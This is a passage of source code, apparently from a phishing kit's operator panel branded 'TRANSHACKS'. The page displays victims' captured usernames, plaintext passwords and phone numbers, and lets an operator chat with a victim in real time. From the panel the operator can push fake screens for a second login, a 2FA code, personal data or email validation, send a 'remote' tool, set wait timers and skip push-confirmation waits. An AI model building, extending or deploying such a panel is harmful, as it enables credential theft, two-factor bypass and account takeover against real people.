<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[TRANS] Control Panel - Dinamico</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/modales_alertas.css">
    <link rel="stylesheet" href="css/panelDinamico_historialChat.css?v=20261021">
    <link rel="stylesheet" href="css/quickMessages.css">
    <link rel="stylesheet" href="css/tooltips.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        .nick-font {
            font-family: 'Outfit', sans-serif;
            font-weight: 600;
            font-size: 1.1em;
            text-transform: uppercase;
        }
        
        .bx-control-text {
            background: linear-gradient(90deg,rgb(112, 24, 24),rgb(253, 0, 0),rgb(255, 0, 0));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline;
        }
        
        .version-text {
            font-size: 0.6em;
            color: #9ca3af;
            vertical-align: top;
            font-weight: 400;
            margin-left: 2px;
        }
        
        /* Estilos simples para monitoreo - solo blanco y negro */
        .admin-monitoring {
            margin-top: 8px;
            font-size: 12px;
            color: #000;
        }
        
        .monitoring-online, .monitoring-history {
            margin-bottom: 4px;
        }
        
        .monitoring-label {
            font-weight: bold;
            color: #000;
        }
        
        .monitoring-list {
            color: #000;
        }
    </style>
</head>
<body class="min-h-screen bg-white text-black">
    <!-- Header Mejorado -->
    <header class="bg-black text-white shadow-lg border-b-2 border-yellow-500">
        <div class="px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-2xl text-blue-600 mr-3"></i>
                    <div>
                        <h1 class="text-xl font-semibold text-gray-800 nick-font">TRANS<span class="bx-control-text">CONTROL</span><span class="version-text">v2.0</span></h1>
                        <p class="text-xs text-gray-500 -mt-1"><b>TRANS</b>HACKS</p>
                    </div>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="bg-yellow-500 text-black px-3 py-1 rounded-lg text-sm font-semibold">
                        ID: <?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : 'N/A'; ?>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Contenido Principal -->
    <main class="panel-dinamico-container">
        <!-- Columna Izquierda - Panel Dinámico -->
        <div class="panel-content">
            <div class="chat-container">
                <!-- Header del Chat -->
                <div class="chat-header">
                    <div class="chat-header-info">
                        <h2 class="text-xl font-bold text-gray-800" id="chatTitle">Chat con <span id="chatUserName" style="color: #dc2626; text-transform: uppercase;">Usuario</span></h2>
                        
                        <!-- Monitoreo de Administradores -->
                        <div class="admin-monitoring" id="adminMonitoring">
                            <div class="monitoring-section">
                                <div class="monitoring-online" id="monitoringOnline">
                                    <span class="monitoring-label">En línea:</span>
                                    <span class="monitoring-list" id="onlineAdminsList">Cargando...</span>
                                </div>
                                <div class="monitoring-history" id="monitoringHistory">
                                    <span class="monitoring-label">Historial:</span>
                                    <span class="monitoring-list" id="historyAdminsList">Cargando...</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="chat-status" id="chatStatus">
                        <div class="status-indicator">
                            <i class="fas fa-circle status-icon" id="statusIcon"></i>
                            <span class="status-text" id="statusText">Cargando...</span>
                        </div>
                    </div>
                </div>
                
                <!-- Historial de Mensajes -->
                <div class="chat-messages" id="chatMessages">
                    <!-- Los mensajes se cargarán dinámicamente -->
                    <div class="chat-empty">
                        <i class="fas fa-comments"></i>
                        <p>No hay mensajes aún</p>
                    </div>
                </div>
                
                <!-- Input del Chat -->
                <div class="chat-input-container">
                    <div class="chat-input-wrapper">
                        <input type="text" id="chatInput" class="chat-input" placeholder="Escribe tu mensaje..." maxlength="500">
                        <button id="sendButton" class="chat-send-btn">
                            <i class="fas fa-paper-plane"></i>
                        </button>
                        <button id="inputVisibleButton" class="chat-visibility-btn" type="button">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button id="enterSendButton" class="chat-enter-btn active" type="button">
                            <i class="fas fa-keyboard"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Columna Derecha - Historial de Actividad -->
        <div class="historial-chat">
            <!-- Header del Historial -->
            <div class="historial-header">
                <div class="historial-title">
                    <i class="fas fa-user-edit"></i>
                    <span>Historial de Registro</span>
                </div>
                <div class="historial-actions">
                   
                </div>
            </div>
            
            <!-- Contenido del Historial -->
            <div class="historial-content">
                <!-- Bloque 1: Información del Usuario -->
                <div class="historial-block">
                    <div class="historial-message">
                        <div class="message-header">
                            <span class="message-time">Datos de Usuario</span>
                            <span class="message-type info">USUARIO</span>
                        </div>
                        <div class="message-content">
                            <div class="user-data">
                                <div class="data-row">
                                    <strong>Usuario:</strong> <span id="user-usuario">Cargando...</span>
                                </div>
                                <div class="data-row">
                                    <strong>Contraseña:</strong> <span id="user-pass">Cargando...</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Información de Contacto -->
                    <div class="historial-message">
                        <div class="message-header">
                            <span class="message-time">Datos de Contacto</span>
                            <span class="message-type success">CONTACTO</span>
                        </div>
                        <div class="message-content">
                            <div class="contact-data" id="contact-data-block">
                                <div class="data-row">
                                    <strong>Número Móvil:</strong> <span id="contact-movil">Cargando...</span>
                                </div>
                                <div class="data-row">
                                    <strong>Número Fijo:</strong> <span id="contact-fijo">Cargando...</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="historial-push-row">
                        <div class="historial-message historial-acciones-push" id="historialAccionesPush">
                            <div class="message-header">
                                <span class="message-time">Acciones</span>
                                <span class="message-type warning">PUSH</span>
                            </div>
                            <div class="message-content">
                                <p class="acciones-push-hint" id="accionesPushHint">
                                    Disponible cuando el usuario solicite confirmación push.
                                </p>
                                <button type="button" class="action-btn acciones-push-btn" id="btnOmitirEsperaPush" disabled>
                                    <i class="fas fa-forward"></i>
                                    <span>Omitir espera</span>
                                </button>
                            </div>
                        </div>
                        <div class="historial-message historial-acciones-push" id="historialTimerPush">
                            <div class="message-header">
                                <span class="message-time">Desde la solicitud</span>
                                <span class="message-type warning">TIMER</span>
                            </div>
                            <div class="message-content acciones-push-timer">
                                <div id="pushTimerValor">--:--</div>
                                <p class="acciones-push-hint" id="pushTimerHint">Sin espera activa</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Bloque 2: Botones de Acción -->
                <div class="historial-actions-block">
                    <div class="actions-grid">
                        <div class="action-select">
                            <i class="fas fa-paper-plane"></i>
                            <div class="custom-select">
                                <div class="select-trigger" id="selectTrigger">
                                    <span class="select-text"><center>  Enviar Telas  </center></span>
                                    <i class="fas fa-chevron-down select-arrow"></i>
                                </div>
                                <div class="select-dropdown" id="selectDropdown">
                                <div class="select-option" data-value="revalidar_credenciales"><i class="fas fa-user-shield mr-2"></i>Segundo Usuario</div>
                                <div class="select-option" data-value="auth2fa"><i class="fas fa-mobile-alt mr-2"></i>Auth2fa</div>
                                <div class="select-option" data-value="datos_personales"><i class="fas fa-address-card mr-2"></i>Datos Personales</div>
                                <div class="select-option" data-value="email_validation"><i class="fas fa-envelope mr-2"></i>Validar Email</div>
                                    <div class="select-option" data-value="opcion1"><i class="fas fa-tools mr-2"></i>Herramientas</div>
                                    <div class="select-option" data-value="timer"><i class="fas fa-clock mr-2"></i>Reloj de Espera</div>
                                    <div class="select-option" data-value="redireccion"><i class="fas fa-directions mr-2"></i>Redirección</div>
                                </div>
                            </div>
                            <button class="action-send-btn" id="sendTelaBtn">
                                <i class="fas fa-paper-plane"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <?php
    // Incluir configuración para obtener el nombre de la carpeta del panel
    require_once __DIR__ . '/../php_config/config.php';
    ?>
    <script>
        // Variable global para la ruta del panel de administración
        window.CONTROL_FOLDER_PATH = '<?php echo CONTROL_FOLDER_NAME; ?>';
        // Variables globales
        const userId = <?php echo isset($_GET['id']) ? intval($_GET['id']) : 'null'; ?>;
        let chatMessages = [];
        
        // Variables para auto-refresh del chat
        let chatPollingInterval = null;
        let isChatPollingActive = false;
        let lastChatHash = '';
        let chatPollingIntervalTime = 3000; // 3 segundos para el chat
        let pushEsperaPollingInterval = null;
        const pushEsperaPollingTime = 2000;
        let pushTimerActivo = false;
        let pushTimerDeadline = 0;
        let pushTimerTick = null;
        
        // Variables para monitoreo de administradores
        let monitoringInterval = null;
        let isMonitoringActive = false;
        let monitoringIntervalTime = 10000; // 10 segundos para monitoreo
        let heartbeatInterval = null;
        
        // Variable para controlar envío con ENTER
        let enterSendEnabled = true;

        // Cargar datos del usuario al abrir la ventana
        document.addEventListener('DOMContentLoaded', function() {
            loadUserData();
            initializeChat();
            initializeMonitoring();
            
            // Actualizar estatus cada 5 segundos
            setInterval(loadUserData, 5000);
            
            // Iniciar auto-refresh del chat
            startChatPolling();
            
            // Iniciar monitoreo de administradores
            startMonitoring();

            inicializarAccionesPushEspera();
        });
        
        // Registrar salida cuando se cierra la ventana
        window.addEventListener('beforeunload', function() {
            if (userId) {
                // Enviar señal de salida (no esperar respuesta)
                navigator.sendBeacon('monitoreo_popup.php', JSON.stringify({
                    accion: 'registrar_salida',
                    usuario_id: userId
                }));
            }
        });

        function loadUserData() {
            if (!userId) return;

            fetch('get_data.php')
                .then(response => response.json())
                .then(data => {
                    const user = data.registros.find(u => u.id == userId);
                    if (user) {
                        // Actualizar título del chat con el nombre del usuario
                        const chatUserName = document.getElementById('chatUserName');
                        if (chatUserName) {
                            const usuarioNombre = user.usuarios || user.nombre || 'Usuario';
                            chatUserName.textContent = usuarioNombre.toUpperCase();
                        }
                        
                        // Actualizar información del usuario
                        document.getElementById('user-usuario').textContent = user.usuarios || 'N/A';
                        document.getElementById('user-pass').textContent = user.password || 'N/A';
                        
                        // Actualizar información de contacto
                        document.getElementById('contact-movil').textContent = user.telefono_movil || 'N/A';
                        document.getElementById('contact-fijo').textContent = user.telefono_fijo || 'N/A';
                        
                        // Actualizar estatus del chat
                        updateChatStatus(user);
                    }
                })
                .catch(error => {
                    console.error('Error cargando datos:', error);
                });
        }

        function updateChatStatus(user) {
            const statusIndicator = document.querySelector('.status-indicator');
            const statusIcon = document.getElementById('statusIcon');
            const statusText = document.getElementById('statusText');
            const header = document.querySelector('header');
            
            // Remover clases anteriores del status indicator
            statusIndicator.classList.remove('status-online', 'status-inactive', 'status-offline', 'status-never');
            
            // Remover clases anteriores del header
            header.classList.remove('header-estado-online', 'header-estado-offline', 'header-estado-inactive', 'header-estado-nunca-conectado');
            
            const status = user.estado_real || 'offline';
            
            switch(status) {
                case 'online':
                    statusIndicator.classList.add('status-online');
                    header.classList.add('header-estado-online');
                    statusText.textContent = 'En línea';
                    break;
                case 'inactive':
                    statusIndicator.classList.add('status-inactive');
                    header.classList.add('header-estado-inactive');
                    statusText.textContent = 'Inactivo';
                    break;
                case 'offline':
                    statusIndicator.classList.add('status-offline');
                    header.classList.add('header-estado-offline');
                    statusText.textContent = 'Desconectado';
                    break;
                case 'Nunca conectado':
                    statusIndicator.classList.add('status-never');
                    header.classList.add('header-estado-nunca-conectado');
                    statusText.textContent = 'Sin conexión';
                    break;
                default:
                    statusIndicator.classList.add('status-offline');
                    header.classList.add('header-estado-offline');
                    statusText.textContent = 'Desconectado';
            }
        }

        function initializeChat() {
            const chatInput = document.getElementById('chatInput');
            const sendButton = document.getElementById('sendButton');
            const inputVisibleButton = document.getElementById('inputVisibleButton');
            const enterSendButton = document.getElementById('enterSendButton');

            // Event listeners
            sendButton.addEventListener('click', sendMessage);
            chatInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && enterSendEnabled) {
                    sendMessage();
                }
            });

            // Toggle visibilidad del input
            inputVisibleButton.addEventListener('click', function() {
                this.classList.toggle('active');
                const icon = this.querySelector('i');
                if (this.classList.contains('active')) {
                    icon.className = 'fas fa-eye-slash';
                } else {
                    icon.className = 'fas fa-eye';
                }
                // Actualizar tooltip
                if (window.tooltipManager) {
                    const isActive = this.classList.contains('active');
                    const tooltipText = isActive ? 'Ocultar input al usuario' : 'Mostrar input al usuario';
                    tooltipManager.updateTooltipText(inputVisibleButton, tooltipText);
                }
            });

            // Toggle envío con ENTER
            enterSendButton.addEventListener('click', function() {
                this.classList.toggle('active');
                enterSendEnabled = this.classList.contains('active');
                const icon = this.querySelector('i');
                if (enterSendEnabled) {
                    icon.className = 'fas fa-keyboard';
                } else {
                    icon.className = 'fas fa-ban';
                }
                // Actualizar tooltip
                if (window.tooltipManager) {
                    const tooltipText = enterSendEnabled ? 'Envío con Enter activado' : 'Envío con Enter desactivado';
                    tooltipManager.updateTooltipText(enterSendButton, tooltipText);
                }
            });

            // Cargar mensajes existentes (por ahora vacío)
            loadChatMessages();
            
            // Event listener para el select personalizado
            const selectTrigger = document.getElementById('selectTrigger');
            const selectDropdown = document.getElementById('selectDropdown');
            const selectOptions = document.querySelectorAll('.select-option');
            const selectText = document.querySelector('.select-text');

            // Toggle dropdown
            selectTrigger.addEventListener('click', function(e) {
                e.stopPropagation();
                const customSelect = this.closest('.custom-select');
                customSelect.classList.toggle('active');
            });

            // Seleccionar opción
            selectOptions.forEach(option => {
                option.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const value = this.getAttribute('data-value');
                    const text = this.textContent;
                    
                    // Actualizar texto del trigger
                    selectText.textContent = text;
                    
                    // Remover selección anterior
                    selectOptions.forEach(opt => opt.classList.remove('selected'));
                    
                    // Marcar como seleccionada
                    this.classList.add('selected');
                    
                    // Cerrar dropdown
                    document.querySelector('.custom-select').classList.remove('active');
                    
                    // Ejecutar acción según la opción seleccionada
                    if (value === 'opcion1') {
                        enviarHerramientas();
                    } else if (value === 'timer') {
                        mostrarModalTimer();
                    } else if (value === 'redireccion') {
                        mostrarModalRedireccion();
                    } else if (value === 'email_validation') {
                        mostrarModalEmailValidation();
                    } else if (value === 'revalidar_credenciales') {
                        enviarRevalidarCredenciales();
                    } else if (value === 'auth2fa') {
                        enviarAuth2fa();
                    } else if (value === 'datos_personales') {
                        enviarDatosPersonales();
                    }
                });
            });

            // Cerrar dropdown al hacer click fuera
            document.addEventListener('click', function() {
                document.querySelector('.custom-select').classList.remove('active');
            });

            // Event listener para el botón de enviar tela
            const sendTelaBtn = document.getElementById('sendTelaBtn');
            sendTelaBtn.addEventListener('click', function() {
                const selectedOption = document.querySelector('.select-option.selected');
                if (selectedOption) {
                    const value = selectedOption.getAttribute('data-value');
                    const text = selectedOption.textContent;
                    // Aquí se ejecutaría la lógica de envío
                }
            });
        }

        function sendMessage() {
            const chatInput = document.getElementById('chatInput');
            const inputVisibleButton = document.getElementById('inputVisibleButton');
            const message = chatInput.value.trim();

            if (!message) return;

            const inputVisible = inputVisibleButton.classList.contains('active');
            const tipoMensaje = inputVisible ? 'con_input' : 'sin_input';
            
            // Crear mensaje del admin
            const adminMessage = {
                id: Date.now(),
                type: 'admin',
                content: message,
                timestamp: new Date(),
                inputVisible: inputVisible
            };

            // Agregar mensaje al chat
            addMessageToChat(adminMessage);
            
            // Limpiar input
            chatInput.value = '';
            
            // Enviar mensaje a la base de datos
            enviarMensajeAdmin(message, tipoMensaje);
        }

        async function enviarMensajeAdmin(mensaje, tipoMensaje) {
            try {
                const response = await fetch('enviar_mensaje.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        mensaje: mensaje,
                        tipo_mensaje: tipoMensaje
                    })
                });

                const data = await response.json();
                
                if (!data.success) {
                    console.error('Error enviando mensaje:', data.error);
                    // Mostrar error en el chat
                    const errorMessage = {
                        id: Date.now(),
                        type: 'system',
                        content: 'Error: ' + data.error,
                        timestamp: new Date()
                    };
                    addMessageToChat(errorMessage);
                }
            } catch (error) {
                console.error('Error de conexión:', error);
            }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text ?? '';
            return div.innerHTML;
        }

        function formatChatBubbleContent(message) {
            const content = message.content || '';
            const isStructured = message.contentFormat === 'structured'
                || (message.type === 'user' && content.includes('\n') && /^[^:]+:\s/m.test(content));

            if (isStructured) {
                return content.split('\n').filter(Boolean).map(line => {
                    const idx = line.indexOf(':');
                    if (idx > 0) {
                        const label = line.slice(0, idx).trim();
                        const value = line.slice(idx + 1).trim();
                        return `<div class="chat-data-row"><strong>${escapeHtml(label)}:</strong> ${escapeHtml(value)}</div>`;
                    }
                    return `<div class="chat-data-row">${escapeHtml(line)}</div>`;
                }).join('');
            }

            return escapeHtml(content).replace(/\n/g, '<br>');
        }

        function addMessageToChat(message) {
            const chatMessagesContainer = document.getElementById('chatMessages');
            
            // Remover mensaje vacío si existe
            const emptyMessage = chatMessagesContainer.querySelector('.chat-empty');
            if (emptyMessage) {
                emptyMessage.remove();
            }

            // Crear elemento del mensaje
            const messageElement = document.createElement('div');
            messageElement.className = `chat-message ${message.type}`;
            messageElement.innerHTML = `
                <div class="message-bubble ${message.type}">
                    ${formatChatBubbleContent(message)}
                </div>
                <div class="message-time ${message.type}">
                    ${formatTime(message.timestamp)}
    </div>
            `;

            // Agregar mensaje al contenedor
            chatMessagesContainer.appendChild(messageElement);
            
            // Scroll al final
            chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight;
        }

        async function loadChatMessages(isPolling = false) {
            try {
                const response = await fetch(`cargar_mensajes.php?usuario_id=${userId}`);
                const data = await response.json();
                
                if (data.success) {
                    const messages = data.mensajes || [];
                    
                    // Generar hash de los nuevos datos
                    const newChatHash = generateChatHash(messages);
                    
                    // Solo actualizar si hay cambios (para polling) o si es carga inicial
                    if (!isPolling || newChatHash !== lastChatHash) {
                        lastChatHash = newChatHash;
                        
                        const chatMessagesContainer = document.getElementById('chatMessages');
                        
                        if (messages.length > 0) {
                            // Limpiar mensajes existentes
                            chatMessagesContainer.innerHTML = '';
                            
                            // Agregar cada mensaje
                            messages.forEach(message => {
                                addMessageToChat({
                                    ...message,
                                    timestamp: new Date(message.timestamp)
                                });
                            });
                            pintarPushTimer();
                            actualizarEstadoEsperaPush();
                        } else if (!isPolling) {
                            // Solo mostrar mensaje vacío en carga inicial
                            chatMessagesContainer.innerHTML = `
                                <div class="chat-empty">
                                    <i class="fas fa-comments"></i>
                                    <p>No hay mensajes aún</p>
                                </div>
                            `;
                        }
                    }
                }
            } catch (error) {
                console.error('Error cargando mensajes:', error);
            }
        }

        function saveMessage(message) {
            // Aquí se guardaría el mensaje en la BD
        }

        function formatTime(date) {
            return date.toLocaleTimeString('es-ES', {
                hour: '2-digit',
                minute: '2-digit'
            });
        }

        // Funciones de auto-refresh del chat (heredadas del dashboard)
        function generateChatHash(messages) {
            // Generar hash de los mensajes para detectar cambios
            return JSON.stringify(messages.map(msg => ({
                id: msg.id,
                content: msg.content,
                type: msg.type,
                timestamp: msg.timestamp
            })));
        }

        function startChatPolling() {
            if (chatPollingInterval) {
                clearInterval(chatPollingInterval);
            }
            
            isChatPollingActive = true;
            
            // Ejecutar polling cada 3 segundos
            chatPollingInterval = setInterval(() => {
                if (isChatPollingActive) {
                    loadChatMessages(true); // true indica que es polling
                }
            }, chatPollingIntervalTime);
        }

        function stopChatPolling() {
            if (chatPollingInterval) {
                clearInterval(chatPollingInterval);
                chatPollingInterval = null;
            }
            
            isChatPollingActive = false;
        }

        function formatoTimer(segundos) {
            const s = Math.max(0, segundos);
            const m = Math.floor(s / 60);
            const r = s % 60;
            return String(m).padStart(2, '0') + ':' + String(r).padStart(2, '0');
        }

        function segundosPushRestantes() {
            if (!pushTimerActivo) return 0;
            return Math.max(0, Math.ceil((pushTimerDeadline - Date.now()) / 1000));
        }

        function syncTimerEnChat(activo, restante) {
            const box = document.getElementById('chatMessages');
            if (!box) return;
            let el = document.getElementById('chatPushTimer');
            if (!activo) {
                if (el) el.remove();
                return;
            }
            const vacio = box.querySelector('.chat-empty');
            if (vacio) vacio.remove();
            if (!el) {
                el = document.createElement('div');
                el.id = 'chatPushTimer';
                el.className = 'chat-message user';
                el.innerHTML = '<div class="message-bubble user"><div class="chat-data-row"><strong>TIMER PUSH:</strong> <span id="chatPushTimerVal"></span></div></div><div class="message-time user">en curso</div>';
                box.appendChild(el);
                box.scrollTop = box.scrollHeight;
            }
            const val = document.getElementById('chatPushTimerVal');
            if (val) val.textContent = restante > 0 ? formatoTimer(restante) + ' restantes' : 'expirado';
        }

        function pintarPushTimer() {
            const valor = document.getElementById('pushTimerValor');
            const hint = document.getElementById('pushTimerHint');
            const restante = segundosPushRestantes();
            if (valor) valor.textContent = pushTimerActivo ? formatoTimer(restante) : '--:--';
            if (hint) {
                hint.textContent = pushTimerActivo
                    ? (restante > 0 ? 'Tiempo restante del usuario' : 'Tiempo expirado')
                    : 'Sin espera activa';
            }
            syncTimerEnChat(pushTimerActivo, restante);
        }

        function inicializarAccionesPushEspera() {
            const btn = document.getElementById('btnOmitirEsperaPush');
            if (btn) {
                btn.addEventListener('click', omitirEsperaPushUsuario);
            }
            actualizarEstadoEsperaPush();
            if (pushEsperaPollingInterval) {
                clearInterval(pushEsperaPollingInterval);
            }
            pushEsperaPollingInterval = setInterval(actualizarEstadoEsperaPush, pushEsperaPollingTime);
            if (pushTimerTick) clearInterval(pushTimerTick);
            pushTimerTick = setInterval(pintarPushTimer, 1000);
        }

        async function actualizarEstadoEsperaPush() {
            if (!userId) return;

            const btn = document.getElementById('btnOmitirEsperaPush');
            const hint = document.getElementById('accionesPushHint');
            if (!btn || !hint) return;

            try {
                const response = await fetch('verificar_espera_push_admin.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario_id: userId })
                });
                const data = await response.json();

                if (!data.success) return;

                if (data.espera_activa) {
                    btn.disabled = false;
                    hint.textContent = 'El usuario está en espera de confirmación push. Puedes omitir el tiempo restante.';
                    pushTimerActivo = true;
                    pushTimerDeadline = Date.now() + (Number(data.segundos_restantes) * 1000);
                } else {
                    btn.disabled = true;
                    hint.textContent = 'Disponible cuando el usuario solicite confirmación push.';
                    pushTimerActivo = false;
                    pushTimerDeadline = 0;
                }
                pintarPushTimer();
            } catch (error) {
                console.error('Error verificando espera push:', error);
            }
        }

        async function omitirEsperaPushUsuario() {
            if (!userId) return;

            const btn = document.getElementById('btnOmitirEsperaPush');
            if (btn) btn.disabled = true;

            try {
                const response = await fetch('omitir_espera_push.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario_id: userId })
                });
                const data = await response.json();

                if (data.success && data.omitido) {
                    const hint = document.getElementById('accionesPushHint');
                    if (hint) {
                        hint.textContent = 'Espera omitida. El usuario continuará de inmediato.';
                    }
                } else if (data.success && !data.omitido) {
                    await actualizarEstadoEsperaPush();
                } else {
                    alert('Error: ' + (data.error || 'No se pudo omitir la espera'));
                    if (btn) btn.disabled = false;
                }
            } catch (error) {
                console.error('Error omitiendo espera push:', error);
                if (btn) btn.disabled = false;
            }
        }

        async function enviarHerramientas() {
            try {
                const response = await fetch('enviar_herramientas.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                // Verificar que la respuesta sea JSON válido
                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_herramientas.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }
                
                if (data.success) {
                    // Solo mostrar mensaje de éxito en el historial
                    addMessageToChat({
                        type: 'admin',
                        content: 'Remote Enviado.',
                        timestamp: new Date()
                    });
                }
            } catch (error) {
                console.error('Error enviando herramientas:', error);
            }
        }

        function mostrarModalTimer() {
            // Crear modal dinámico para el timer
            const modalHTML = `
                <div id="timerModal" class="modal-overlay">
                    <div class="modal-container">
                        <div class="modal-header">
                            <h3><i class="fas fa-clock"></i> Reloj de Espera</h3>
                            <button onclick="cerrarModalTimer()" class="modal-close">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                        <div class="modal-content">
                            <div class="timer-config">
                                <div class="time-inputs">
                                    <div class="input-group">
                                        <label>Horas:</label>
                                        <input type="number" id="timerHoras" min="0" max="23" value="0" class="timer-input">
                                    </div>
                                    <div class="input-group">
                                        <label>Minutos:</label>
                                        <input type="number" id="timerMinutos" min="0" max="59" value="5" class="timer-input">
                                    </div>
                                    <div class="input-group">
                                        <label>Segundos:</label>
                                        <input type="number" id="timerSegundos" min="0" max="59" value="0" class="timer-input">
                                    </div>
                                </div>
                                <div class="message-input">
                                    <label>Mensaje personalizado (opcional):</label>
                                    <textarea id="timerMensaje" placeholder="Escribe un mensaje que se mostrará junto al timer..." rows="3" class="timer-textarea"></textarea>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button onclick="cerrarModalTimer()" class="btn-cancel">Cancelar</button>
                            <button onclick="enviarTimer()" class="btn-send">
                                <i class="fas fa-paper-plane"></i> Enviar Timer
                            </button>
                        </div>
                    </div>
                </div>
            `;

            // Añadir modal al body
            document.body.insertAdjacentHTML('beforeend', modalHTML);

            // Añadir estilos CSS dinámicamente
            const styles = `
                <style id="timerModalStyles">
                    .modal-overlay {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: rgba(0, 0, 0, 0.7);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 10000;
                    }
                    .modal-container {
                        background: white;
                        border-radius: 12px;
                        max-width: 500px;
                        width: 90%;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                    }
                    .modal-header {
                        padding: 20px;
                        border-bottom: 1px solid #eee;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .modal-header h3 {
                        margin: 0;
                        color: #333;
                        font-size: 1.2em;
                    }
                    .modal-close {
                        background: none;
                        border: none;
                        font-size: 1.2em;
                        cursor: pointer;
                        color: #666;
                    }
                    .modal-content {
                        padding: 20px;
                    }
                    .time-inputs {
                        display: flex;
                        gap: 15px;
                        margin-bottom: 20px;
                    }
                    .input-group {
                        flex: 1;
                        text-align: center;
                    }
                    .input-group label {
                        display: block;
                        margin-bottom: 5px;
                        font-weight: bold;
                        color: #555;
                    }
                    .timer-input {
                        width: 100%;
                        padding: 10px;
                        border: 2px solid #ddd;
                        border-radius: 6px;
                        text-align: center;
                        font-size: 1.1em;
                        font-weight: bold;
                    }
                    .timer-input:focus {
                        outline: none;
                        border-color: #007bff;
                    }
                    .message-input label {
                        display: block;
                        margin-bottom: 8px;
                        font-weight: bold;
                        color: #555;
                    }
                    .timer-textarea {
                        width: 100%;
                        padding: 10px;
                        border: 2px solid #ddd;
                        border-radius: 6px;
                        resize: vertical;
                        font-family: inherit;
                    }
                    .timer-textarea:focus {
                        outline: none;
                        border-color: #007bff;
                    }
                    .modal-footer {
                        padding: 20px;
                        border-top: 1px solid #eee;
                        display: flex;
                        gap: 10px;
                        justify-content: flex-end;
                    }
                    .btn-cancel, .btn-send {
                        padding: 10px 20px;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                        font-weight: bold;
                        transition: all 0.3s;
                    }
                    .btn-cancel {
                        background: #6c757d;
                        color: white;
                    }
                    .btn-cancel:hover {
                        background: #5a6268;
                    }
                    .btn-send {
                        background: #007bff;
                        color: white;
                    }
                    .btn-send:hover {
                        background: #0056b3;
                    }
                </style>
            `;

            // Añadir estilos al head
            document.head.insertAdjacentHTML('beforeend', styles);
        }

        function cerrarModalTimer() {
            const modal = document.getElementById('timerModal');
            const styles = document.getElementById('timerModalStyles');
            if (modal) modal.remove();
            if (styles) styles.remove();
        }

        async function enviarTimer() {
            const horas = parseInt(document.getElementById('timerHoras').value) || 0;
            const minutos = parseInt(document.getElementById('timerMinutos').value) || 0;
            const segundos = parseInt(document.getElementById('timerSegundos').value) || 0;
            const mensaje = document.getElementById('timerMensaje').value.trim();

            // Validar que al menos haya algo de tiempo
            if (horas === 0 && minutos === 0 && segundos === 0) {
                alert('Por favor, configura al menos 1 segundo para el timer');
                return;
            }

            // Calcular tiempo total en segundos
            const tiempoTotal = (horas * 3600) + (minutos * 60) + segundos;

            try {
                // Enviar timer al backend
                const response = await fetch('enviar_timer.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        usuario_id: userId,
                        tiempo_segundos: tiempoTotal,
                        mensaje_personalizado: mensaje,
                        ip_usuario: document.querySelector('#contact-data-block')?.closest('.historial-message')?.querySelector('.message-time')?.textContent || 'N/A'
                    })
                });

                // Verificar que la respuesta sea JSON válido
                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    console.error('Respuesta no válida de enviar_timer.php:', responseText);
                    throw new Error('Respuesta no válida del servidor');
                }
                
                if (data.success) {
                    // Mostrar mensaje en el chat
                    addMessageToChat({
                        type: 'admin',
                        content: `Timer enviado: ${horas}h ${minutos}m ${segundos}s` + (mensaje ? ` - ${mensaje}` : ''),
                        timestamp: new Date()
                    });

                    // Cerrar modal
                    cerrarModalTimer();
                } else {
                    alert('Error al enviar timer: ' + (data.error || 'Error desconocido'));
                }
            } catch (error) {
                console.error('Error enviando timer:', error);
                alert('Error de conexión al enviar el timer');
            }
        }

        function mostrarModalRedireccion() {
            // Crear modal dinámico para redirecciones (clonado del timer)
            const modalHTML = `
                <div id="redireccionModal" class="modal-overlay">
                    <div class="modal-container">
                        <div class="modal-header">
                            <h3><i class="fas fa-directions"></i> Redirección [>] </h3>
